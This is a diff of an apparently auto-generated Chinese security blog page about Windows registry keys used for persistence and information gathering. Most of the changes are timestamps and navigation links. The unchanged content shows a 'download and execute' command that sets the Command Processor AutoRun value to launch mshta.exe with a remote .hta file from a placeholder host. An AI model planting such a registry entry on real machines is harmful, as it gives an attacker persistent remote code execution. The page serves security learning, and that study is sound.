@@ -28,7 +28,7 @@
 <meta property="og:description" content="本文记录那些可以被用来权限维持以及信息探测的注册表项。 启动进程HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce  用于指定那些只需要在下次系统启动时运行一次的程序或命令。与此位置相关的命令或程序在执行完一次后通常会从此列表中自动删除。  下载并执行12reg add &amp;#x27;HKCU\Software\Microsoft\Comma">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-08-29T06:19:49.000Z">
-<meta property="article:modified_time" content="2023-08-29T03:14:06.524Z">
+<meta property="article:modified_time" content="2023-08-29T03:14:08.000Z">
 <meta property="article:author" content="Paul C">
 <meta property="article:tag" content="Windows">
 <meta name="twitter:card" content="summary">
@@ -186,7 +186,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2023-08-29 14:19:49 / Modified: 11:14:06" itemprop="dateCreated datePublished" datetime="2023-08-29T14:19:49+08:00">2023-08-29</time>
+              <time title="Created: 2023-08-29 14:19:49 / Modified: 11:14:08" itemprop="dateCreated datePublished" datetime="2023-08-29T14:19:49+08:00">2023-08-29</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -209,7 +209,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>本文记录那些可以被用来权限维持以及信息探测的注册表项。</p>
+        <p>本文记录那些可以被用来权限维持以及信息探测的注册表项。</p>
 <h2 id="启动进程"><a href="#启动进程" class="headerlink" title="启动进程"></a>启动进程</h2><p><code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</code> </p>
 <p>用于指定那些只需要在下次系统启动时运行一次的程序或命令。与此位置相关的命令或程序在执行完一次后通常会从此列表中自动删除。 </p>
 <h2 id="下载并执行"><a href="#下载并执行" class="headerlink" title="下载并执行"></a>下载并执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg add &#x27;HKCU\Software\Microsoft\Command Processor&#x27; </span><br><span class="line">/v AutoRun /t REG_SZ /d &#x27;mshta.exe&#x27; http:/exam/1.hta /f</span><br></pre></td></tr></table></figure>
@@ -232,12 +232,12 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/categories/CTF/OfficeMacro01/" rel="prev" title="Office宏病毒">
-      <i class="fa fa-chevron-left"></i> Office宏病毒
+    <a href="/categories/CTF/Windows03/" rel="prev" title="Windows信息搜集">
+      <i class="fa fa-chevron-left"></i> Windows信息搜集
     </a></div>
       <div class="post-nav-item">
-    <a href="/categories/CTF/Windows03/" rel="next" title="Windows信息搜集">
-      Windows信息搜集 <i class="fa fa-chevron-right"></i>
+    <a href="/categories/CTF/Shellcode03/" rel="next" title="Powershell脚本">
+      Powershell脚本 <i class="fa fa-chevron-right"></i>
     </a></div>
     </div>
       </footer>
